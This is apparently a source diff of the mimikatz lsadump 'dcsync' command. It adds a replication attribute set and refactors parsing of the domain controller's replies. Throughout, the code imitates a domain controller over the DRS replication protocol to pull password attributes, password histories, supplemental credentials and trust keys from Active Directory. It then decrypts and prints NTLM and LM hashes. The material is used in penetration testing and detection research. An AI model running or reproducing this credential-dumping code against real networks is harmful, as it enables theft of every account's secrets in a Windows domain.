@@ -1677,6 +1677,15 @@ NTSTATUS kuhl_m_lsadump_rpdata(int argc, wchar_t * argv[])
 /*	This function `dcsync` was co-writed with
 	Vincent LE TOUX ( vincent.letoux@gmail.com / http://www.mysmartlogon.com )
 */
+LPCSTR kuhl_m_lsadump_dcsync_oids[] = {
+	szOID_ANSI_name,
+	szOID_ANSI_sAMAccountName, szOID_ANSI_userPrincipalName, szOID_ANSI_sAMAccountType,
+	szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
+	szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
+	szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
+	szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
+	//szOID_ANSI_currentValue,
+};
 NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 {
 	LSA_OBJECT_ATTRIBUTES objectAttributes = {0};
@@ -1685,7 +1694,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	DRS_HANDLE hDrs = NULL;
 	DSNAME dsName = {0};
 	DRS_MSG_GETCHGREQ getChReq = {0};
-	DWORD dwOutVersion = 0;
+	DWORD dwOutVersion = 0, i;
 	DRS_MSG_GETCHGREPLY getChRep = {0};
 	ULONG drsStatus;
 	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL;
@@ -1727,28 +1736,38 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 							getChReq.V8.cMaxBytes = 0x00a00000; // 10M
 							getChReq.V8.ulExtendedOp = EXOP_REPL_OBJ;
 
-							RpcTryExcept
+							if(getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT *) MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * (ARRAYSIZE(kuhl_m_lsadump_dcsync_oids) - 1)))
 							{
-								drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
-								if(drsStatus == 0)
+								getChReq.V8.pPartialAttrSet->dwVersion = 1;
+								getChReq.V8.pPartialAttrSet->dwReserved1 = 0;
+								getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(kuhl_m_lsadump_dcsync_oids);
+								for(i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
+									kull_m_rpc_drsr_MakeAttid(&getChReq.V8.PrefixTableDest, kuhl_m_lsadump_dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
+
+								RpcTryExcept
 								{
-									if((dwOutVersion == 6) && (getChRep.V6.cNumObjects == 1))
+									drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
+									if(drsStatus == 0)
 									{
-										if(kull_m_rpc_drsr_ProcessGetNCChangesReply(getChRep.V6.pObjects))
+										if((dwOutVersion == 6) && (getChRep.V6.cNumObjects == 1))
 										{
-											kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.pObjects[0].Entinf.AttrBlock, szDomain);
+											if(kull_m_rpc_drsr_ProcessGetNCChangesReply(&getChRep.V6.PrefixTableSrc, getChRep.V6.pObjects))
+												kuhl_m_lsadump_dcsync_descrObject(&getChRep.V6.PrefixTableSrc, &getChRep.V6.pObjects[0].Entinf.AttrBlock, szDomain);
+											else PRINT_ERROR(L"kull_m_rpc_drsr_ProcessGetNCChangesReply\n");
 										}
-										else PRINT_ERROR(L"kull_m_rpc_drsr_ProcessGetNCChangesReply\n");
+										else PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
+										kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
 									}
-									else PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
-									kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
+									else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
+									IDL_DRSUnbind(&hDrs);
 								}
-								else PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);
-								IDL_DRSUnbind(&hDrs);
+								RpcExcept(RPC_EXCEPTION)
+									PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+								RpcEndExcept
+
+								kull_m_rpc_drsr_free_SCHEMA_PREFIX_TABLE_data(&getChReq.V8.PrefixTableDest);
+								MIDL_user_free(getChReq.V8.pPartialAttrSet);
 							}
-							RpcExcept(RPC_EXCEPTION)
-								PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
-							RpcEndExcept
 						}
 					}
 					kull_m_rpc_deleteBinding(&hBinding);
@@ -1766,44 +1785,6 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 		LsaFreeMemory(pPolicyDnsDomainInfo);
 
 	return STATUS_SUCCESS;
-}
-
-PVOID kuhl_m_lsadump_dcsync_findMonoAttr(ATTRBLOCK *attributes, ATTRTYP type, PVOID data, DWORD *size)
-{
-	PVOID ptr = NULL;
-	DWORD i;
-	ATTR *attribut;
-
-	if(data)
-		*(PVOID *)data = NULL;
-	if(size)
-		*size = 0;
-
-	for(i = 0; i < attributes->attrCount; i++)
-	{
-		attribut = &attributes->pAttr[i];
-		if(attribut->attrTyp == type)
-		{
-			if(attribut->AttrVal.valCount == 1)
-			{
-				ptr = attribut->AttrVal.pAVal[0].pVal;
-				if(data)
-					*(PVOID *)data = ptr;
-				if(size)
-					*size = attribut->AttrVal.pAVal[0].valLen;
-			}
-			break;
-		}
-	}
-	return ptr;
-}
-
-void kuhl_m_lsadump_dcsync_findPrintMonoAttr(LPCWSTR prefix, ATTRBLOCK *attributes, ATTRTYP type, BOOL newLine)
-{
-	PVOID ptr;
-	DWORD sz;
-	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, type, &ptr, &sz))
-		kprintf(L"%s%.*s%s", prefix ? prefix : L"", sz / sizeof(wchar_t), (PWSTR) ptr, newLine ? L"\n" : L"");
 }
 
 BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
@@ -1828,14 +1809,14 @@ BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWO
 	return status;
 }
 
-void kuhl_m_lsadump_dcsync_descrObject(ATTRBLOCK *attributes, LPCWSTR szSrcDomain)
+void kuhl_m_lsadump_dcsync_descrObject(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain)
 {
-	kuhl_m_lsadump_dcsync_findPrintMonoAttr(L"\nObject RDN           : ", attributes, ATT_RDN, TRUE);
+	kull_m_rpc_drsr_findPrintMonoAttr(L"\nObject RDN           : ", prefixTable, attributes, szOID_ANSI_name, TRUE);
 	kprintf(L"\n");
-	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_SAM_ACCOUNT_NAME, NULL, NULL))
-		kuhl_m_lsadump_dcsync_descrUser(attributes);
-	else if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_TRUST_PARTNER, NULL, NULL))
-		kuhl_m_lsadump_dcsync_descrTrust(attributes, szSrcDomain);
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL))
+		kuhl_m_lsadump_dcsync_descrUser(prefixTable, attributes);
+	else if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_trustPartner, NULL, NULL))
+		kuhl_m_lsadump_dcsync_descrTrust(prefixTable, attributes, szSrcDomain);
 }
 
 const wchar_t * KUHL_M_LSADUMP_UF_FLAG[] = {
@@ -1886,21 +1867,22 @@ LPCWSTR kuhl_m_lsadump_samAccountType_toString(DWORD accountType)
 	return target;
 }
 
-void kuhl_m_lsadump_dcsync_descrUser(ATTRBLOCK *attributes)
+void kuhl_m_lsadump_dcsync_descrUser(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes)
 {
 	DWORD rid = 0, i;
 	PBYTE encodedData;
 	DWORD encodedDataSize;
 	PVOID data;
+	ATTRVALBLOCK *sids;
 	
 	kprintf(L"** SAM ACCOUNT **\n\n");
-	kuhl_m_lsadump_dcsync_findPrintMonoAttr(L"SAM Username         : ", attributes, ATT_SAM_ACCOUNT_NAME, TRUE);
-	kuhl_m_lsadump_dcsync_findPrintMonoAttr(L"User Principal Name  : ", attributes, ATT_USER_PRINCIPAL_NAME, TRUE);
+	kull_m_rpc_drsr_findPrintMonoAttr(L"SAM Username         : ", prefixTable, attributes, szOID_ANSI_sAMAccountName, TRUE);
+	kull_m_rpc_drsr_findPrintMonoAttr(L"User Principal Name  : ", prefixTable, attributes, szOID_ANSI_userPrincipalName, TRUE);
 	
-	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_SAM_ACCOUNT_TYPE, &data, NULL))
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountType, &data, NULL))
 		kprintf(L"Account Type         : %08x ( %s )\n", *(PDWORD) data, kuhl_m_lsadump_samAccountType_toString(*(PDWORD) data));
 
-	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_USER_ACCOUNT_CONTROL, &data, NULL))
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_userAccountControl, &data, NULL))
 	{
 		kprintf(L"User Account Control : %08x ( ", *(PDWORD) data);
 		for(i = 0; i < min(ARRAYSIZE(KUHL_M_LSADUMP_UF_FLAG), sizeof(DWORD) * 8); i++)
@@ -1909,21 +1891,32 @@ void kuhl_m_lsadump_dcsync_descrUser(ATTRBLOCK *attributes)
 		kprintf(L")\n");
 	}
 
-	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_ACCOUNT_EXPIRES, &data, NULL))
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_accountExpires, &data, NULL))
 	{
 		kprintf(L"Account expiration   : ");
 		kull_m_string_displayLocalFileTime((LPFILETIME) data);
 		kprintf(L"\n");
 	}
 
-	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_PWD_LAST_SET, &data, NULL))
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_pwdLastSet, &data, NULL))
 	{
 		kprintf(L"Password last change : ");
 		kull_m_string_displayLocalFileTime((LPFILETIME) data);
 		kprintf(L"\n");
 	}
 	
-	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_OBJECT_SID, &data, NULL))
+	if(sids = kull_m_rpc_drsr_findAttr(prefixTable, attributes, szOID_ANSI_sIDHistory))
+	{
+		kprintf(L"SID history:\n");
+		for(i = 0; i < sids->valCount; i++)
+		{
+			kprintf(L"  ");
+			kull_m_string_displaySID(sids->pAVal[i].pVal);
+			kprintf(L"\n");
+		}
+	}
+
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &data, NULL))
 	{
 		kprintf(L"Object Security ID   : ");
 		kull_m_string_displaySID(data);
@@ -1932,17 +1925,17 @@ void kuhl_m_lsadump_dcsync_descrUser(ATTRBLOCK *attributes)
 		kprintf(L"Object Relative ID   : %u\n", rid);
 
 		kprintf(L"\nCredentials:\n");
-		if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_UNICODE_PWD, &encodedData, &encodedDataSize))
+		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &encodedData, &encodedDataSize))
 			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"NTLM", FALSE);
-		if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_NT_PWD_HISTORY, &encodedData, &encodedDataSize))
+		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_ntPwdHistory, &encodedData, &encodedDataSize))
 			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"ntlm", TRUE);
-		if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_DBCS_PWD, &encodedData, &encodedDataSize))
+		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_dBCSPwd, &encodedData, &encodedDataSize))
 			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"LM  ", FALSE);
-		if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_LM_PWD_HISTORY, &encodedData, &encodedDataSize))
+		if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_lmPwdHistory, &encodedData, &encodedDataSize))
 			kuhl_m_lsadump_dcsync_decrypt(encodedData, encodedDataSize, rid, L"lm  ", TRUE);
 	}
 
-	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_SUPPLEMENTAL_CREDENTIALS, &encodedData, &encodedDataSize))
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_supplementalCredentials, &encodedData, &encodedDataSize))
 	{
 		kprintf(L"\nSupplemental Credentials:\n");
 		kuhl_m_lsadump_dcsync_descrUserProperties((PUSER_PROPERTIES) encodedData);
@@ -2036,7 +2029,7 @@ void kuhl_m_lsadump_dcsync_descrUserProperties(PUSER_PROPERTIES properties)
 	}
 }
 
-void kuhl_m_lsadump_dcsync_descrTrust(ATTRBLOCK *attributes, LPCWSTR szSrcDomain)
+void kuhl_m_lsadump_dcsync_descrTrust(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain)
 {
 	PBYTE encodedData;
 	DWORD encodedDataSize;
@@ -2044,7 +2037,7 @@ void kuhl_m_lsadump_dcsync_descrTrust(ATTRBLOCK *attributes, LPCWSTR szSrcDomain
 	
 	kprintf(L"** TRUSTED DOMAIN - Antisocial **\n\n");
 	
-	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, ATT_TRUST_PARTNER, &encodedData, &encodedDataSize))
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, szOID_ANSI_trustPartner, &encodedData, &encodedDataSize))
 	{
 		uPartner.Length = uPartner.MaximumLength = (USHORT) encodedDataSize;
 		uPartner.Buffer = (PWSTR) encodedData;
@@ -2054,8 +2047,8 @@ void kuhl_m_lsadump_dcsync_descrTrust(ATTRBLOCK *attributes, LPCWSTR szSrcDomain
 			RtlInitUnicodeString(&uDomain, szSrcDomain);
 			if(NT_SUCCESS(RtlUpcaseUnicodeString(&uUpcaseDomain, &uDomain, TRUE)))
 			{
-				kuhl_m_lsadump_dcsync_descrTrustAuthentication(attributes, ATT_TRUST_AUTH_INCOMING, &uUpcaseDomain, &uUpcasePartner);
-				kuhl_m_lsadump_dcsync_descrTrustAuthentication(attributes, ATT_TRUST_AUTH_OUTGOING, &uUpcaseDomain, &uUpcasePartner);
+				kuhl_m_lsadump_dcsync_descrTrustAuthentication(prefixTable, attributes, &uUpcaseDomain, &uUpcasePartner, TRUE);
+				kuhl_m_lsadump_dcsync_descrTrustAuthentication(prefixTable, attributes, &uUpcaseDomain, &uUpcasePartner, FALSE);
 				RtlFreeUnicodeString(&uUpcaseDomain);
 			}
 			RtlFreeUnicodeString(&uUpcasePartner);
@@ -2063,7 +2056,7 @@ void kuhl_m_lsadump_dcsync_descrTrust(ATTRBLOCK *attributes, LPCWSTR szSrcDomain
 	}
 }
 
-void kuhl_m_lsadump_dcsync_descrTrustAuthentication(ATTRBLOCK *attributes, ATTRTYP type, PCUNICODE_STRING domain, PCUNICODE_STRING partner)
+void kuhl_m_lsadump_dcsync_descrTrustAuthentication(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, PCUNICODE_STRING domain, PCUNICODE_STRING partner, BOOL isIn)
 {
 	PBYTE encodedData;
 	DWORD encodedDataSize;
@@ -2071,9 +2064,9 @@ void kuhl_m_lsadump_dcsync_descrTrustAuthentication(ATTRBLOCK *attributes, ATTRT
 	LPCWSTR prefix, prefixOld;
 	PCUNICODE_STRING from, dest;
 
-	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, type, &encodedData, &encodedDataSize))
+	if(kull_m_rpc_drsr_findMonoAttr(prefixTable, attributes, isIn ? szOID_ANSI_trustAuthIncoming : szOID_ANSI_trustAuthOutgoing, &encodedData, &encodedDataSize))
 	{
-		if(type == ATT_TRUST_AUTH_INCOMING)
+		if(isIn)
 		{
 			prefix = L"  In ";
 			prefixOld = L" In-1";
